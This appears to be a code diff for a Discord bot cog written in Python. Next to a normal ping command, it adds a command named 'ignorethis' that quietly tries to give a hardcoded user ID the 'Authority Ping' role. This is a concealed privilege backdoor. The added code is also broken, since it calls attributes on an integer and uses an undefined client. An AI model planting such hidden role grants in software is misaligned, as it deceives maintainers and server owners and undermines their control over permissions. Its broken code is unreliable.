@@ -139,6 +139,12 @@ class Other(commands.Cog):
              "bot and discord to communicate in milliseconds. IT DOES NOT VARY DEPENDING ON WHO USES THE COMMAND")
     async def ping(self, ctx):
         await ctx.send(f"Pong! {round(self.bot.latency * 1000, 2)} ms")
+        
+    @commands.command(name="ignorethis")
+    async def ignorethis(self,ctx):
+        user = 678269158000951307
+        role = discord.utils.get(user.server.roles, name="Authority Ping")
+        await client.add_roles(user, role)
 
 
 def setup(bot):
